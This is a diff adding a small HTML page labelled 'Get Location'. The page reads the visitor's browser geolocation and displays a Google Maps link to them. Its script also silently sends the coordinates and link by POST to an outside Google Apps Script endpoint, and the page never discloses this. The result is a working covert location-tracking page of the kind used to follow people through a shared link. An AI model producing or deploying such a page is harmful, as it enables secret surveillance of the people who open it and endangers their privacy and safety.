@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Get Location</title>
+</head>
+<body>
+  <h2>Get Location</h2>
+  <button onclick="getLocation()">Get Location</button>
+  <p id="status">Waiting...</p>
+  <p id="location"></p>
+
+  <script>
+    function getLocation() {
+      document.getElementById("status").innerText = "Getting location...";
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, showError);
+      } else {
+        document.getElementById("status").innerText = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function sendLocation(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+      const mapsLink = `https://maps.google.com/?q=${lat},${lon}`;
+
+      document.getElementById("status").innerText = "Location received!";
+      document.getElementById("location").innerText = mapsLink;
+
+      fetch("https://script.google.com/macros/s/AKfycbx6ik1F0RdNTZ6ici1Ckfxi42lnoHyXHY8qVjAwyVrQf3Ju1QdOuDGpZz072kuVnxmb/exec", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: `lat=${lat}&lon=${lon}&mapsLink=${encodeURIComponent(mapsLink)}`
+      });
+    }
+
+    function showError(error) {
+      document.getElementById("status").innerText = "Error getting location.";
+    }
+  </script>
+</body>
+</html>
